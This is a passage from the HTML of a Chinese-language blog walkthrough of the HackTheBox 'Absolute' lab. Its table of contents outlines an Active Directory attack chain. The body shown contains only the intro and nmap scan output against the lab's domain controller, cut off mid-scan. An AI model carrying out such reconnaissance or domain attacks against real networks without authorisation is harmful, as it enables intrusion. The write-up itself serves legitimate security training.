@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.lug.ustc.edu.cn/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="简述本文是insane难度的HTB absolute机器的域渗透部分，其中大量的Kerberos，ACL，KrbRelay，bloodhound，Shadow Credentials Attack，ldap enumeration，PTH，GROUPS权限修改，interactive session等域渗透只是细节是此box的特色，主要参考0xdf’s blog absolute walkthro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay]">
+<meta property="og:url" content="https://fdlucifer.github.io/2023/05/29/htb-absolute/index.html">
+<meta property="og:site_name" content="fdvoid0&#39;s blog">
+<meta property="og:description" content="简述本文是insane难度的HTB absolute机器的域渗透部分，其中大量的Kerberos，ACL，KrbRelay，bloodhound，Shadow Credentials Attack，ldap enumeration，PTH，GROUPS权限修改，interactive session等域渗透只是细节是此box的特色，主要参考0xdf’s blog absolute walkthro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute2.png">
+<meta property="article:published_time" content="2023-05-29T01:30:51.000Z">
+<meta property="article:modified_time" content="2023-05-29T11:30:17.339Z">
+<meta property="article:author" content="fdvoid0">
+<meta property="article:tag" content="DC">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute.png">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2023/05/29/htb-absolute/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2023/05/29/htb-absolute/","path":"2023/05/29/htb-absolute/","title":"HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay] | fdvoid0's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="fdvoid0's blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">fdvoid0's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by fdvoid0</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">43</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">42</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">206</span></a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">简述</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">2.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB-TCP-445"><span class="nav-number">2.2.</span> <span class="nav-text">SMB - TCP 445</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP-TCP-389"><span class="nav-number">2.3.</span> <span class="nav-text">LDAP - TCP 389+</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-TCP-x2F-UDP-53"><span class="nav-number">2.4.</span> <span class="nav-text">DNS - TCP&#x2F;UDP 53</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Website-TCP-80"><span class="nav-number">2.5.</span> <span class="nav-text">Website - TCP 80</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%80%E6%9C%AF%E6%A0%88"><span class="nav-number">2.5.1.</span> <span class="nav-text">技术栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="nav-number">2.5.2.</span> <span class="nav-text">目录爆破</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Auth-as-d-klay"><span class="nav-number">3.</span> <span class="nav-text">Auth as d.klay</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%9F%E6%88%90-Username-%E5%AD%97%E5%85%B8"><span class="nav-number">3.1.</span> <span class="nav-text">生成 Username 字典</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Image-Metadata"><span class="nav-number">3.1.1.</span> <span class="nav-text">Image Metadata</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Generate-Users-List"><span class="nav-number">3.1.2.</span> <span class="nav-text">Generate Users List</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%9C%89%E6%95%88%E7%94%A8%E6%88%B7%E5%90%8D"><span class="nav-number">3.1.3.</span> <span class="nav-text">寻找有效用户名</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AS-Rep-Roast"><span class="nav-number">3.2.</span> <span class="nav-text">AS-Rep-Roast</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%93%E5%8F%96hash"><span class="nav-number">3.2.1.</span> <span class="nav-text">抓取hash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="nav-number">3.2.2.</span> <span class="nav-text">破解密码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Kerberos-%E8%AE%A4%E8%AF%81"><span class="nav-number">3.3.</span> <span class="nav-text">Kerberos 认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8CME%E9%AA%8C%E8%AF%81"><span class="nav-number">3.3.1.</span> <span class="nav-text">使用CME验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#kinit"><span class="nav-number">3.3.2.</span> <span class="nav-text">kinit</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Auth-as-svc-smb"><span class="nav-number">4.</span> <span class="nav-text">Auth as svc_smb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Bloodhound"><span class="nav-number">4.1.</span> <span class="nav-text">Bloodhound</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SMB"><span class="nav-number">4.2.</span> <span class="nav-text">SMB</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference-Sources"><span class="nav-number">5.</span> <span class="nav-text">Reference Sources</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fdvoid0"
+      src="/images/blackhole.png">
+  <p class="site-author-name" itemprop="name">fdvoid0</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">206</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="fa fa-stack-exchange fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2023/05/29/htb-absolute/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blackhole.png">
+      <meta itemprop="name" content="fdvoid0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="fdvoid0's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay] | fdvoid0's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HackTheBox Absolute [AS-Rep-Roast + Kerberos Authentication + ACLs Modification + KrbRelay]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2023-05-29 09:30:51 / Modified: 19:30:17" itemprop="dateCreated datePublished" datetime="2023-05-29T09:30:51+08:00">2023-05-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/" itemprop="url" rel="index"><span itemprop="name">Kerberos Authentication</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/" itemprop="url" rel="index"><span itemprop="name">ACLs Modification</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/" itemprop="url" rel="index"><span itemprop="name">KrbRelay</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/" itemprop="url" rel="index"><span itemprop="name">nim dynamic analysis</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/bloodhound/" itemprop="url" rel="index"><span itemprop="name">bloodhound</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/bloodhound/Shadow-Credentials-Attack/" itemprop="url" rel="index"><span itemprop="name">Shadow Credentials Attack</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/bloodhound/Shadow-Credentials-Attack/modified-owner-of-groups/" itemprop="url" rel="index"><span itemprop="name">modified owner of groups</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/bloodhound/Shadow-Credentials-Attack/modified-owner-of-groups/ldap-enumeration/" itemprop="url" rel="index"><span itemprop="name">ldap enumeration</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/bloodhound/Shadow-Credentials-Attack/modified-owner-of-groups/ldap-enumeration/PTH/" itemprop="url" rel="index"><span itemprop="name">PTH</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Kerberos-Authentication/ACLs-Modification/KrbRelay/nim-dynamic-analysis/bloodhound/Shadow-Credentials-Attack/modified-owner-of-groups/ldap-enumeration/PTH/interactive-session-logon-type-9/" itemprop="url" rel="index"><span itemprop="name">interactive session logon type 9</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>3.5k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>13 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h1><p>本文是insane难度的HTB absolute机器的域渗透部分，其中大量的Kerberos，ACL，KrbRelay，bloodhound，Shadow Credentials Attack，ldap enumeration，PTH，GROUPS权限修改，interactive session等域渗透只是细节是此box的特色，主要参考<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIzLzA1LzI3L2h0Yi1hYnNvbHV0ZS5odG1s">0xdf’s blog absolute walkthrough<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9hcHAuaGFja3RoZWJveC5jb20vbWFjaGluZXMvQWJzb2x1dGUvd2Fsa3Rocm91Z2hz">HTB的absolute官方writeup paper<i class="fa fa-external-link-alt"></i></span>记录这篇博客加深记忆和理解，及供后续做深入研究查阅，备忘。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Absolute.png"></li>
+</ul>
+<span id="more"></span>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">root@fdvoid0<span class="comment"># nmap -p- --min-rate 10000 10.10.11.181</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 06:36 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.181</span><br><span class="line">Host is up (0.087s latency).</span><br><span class="line">Not shown: 65509 closed ports</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49674/tcp open  unknown</span><br><span class="line">49675/tcp open  unknown</span><br><span class="line">49686/tcp open  unknown</span><br><span class="line">49692/tcp open  unknown</span><br><span class="line">49699/tcp open  unknown</span><br><span class="line">49703/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.50 seconds</span><br><span class="line"></span><br><span class="line">root@fdvoid0<span class="comment"># nmap -sCV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.11.181</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-21 06:37 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.181</span><br><span class="line">Host is up (0.088s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSVersionBindReqTCP:</span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Absolute</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-21 17:38:06Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2023-05-21T17:40:40+00:00; +6h59m59s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2022-06-09T08:14:24</span><br><span class="line">|_Not valid after:  2023-06-09T08:14:24</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 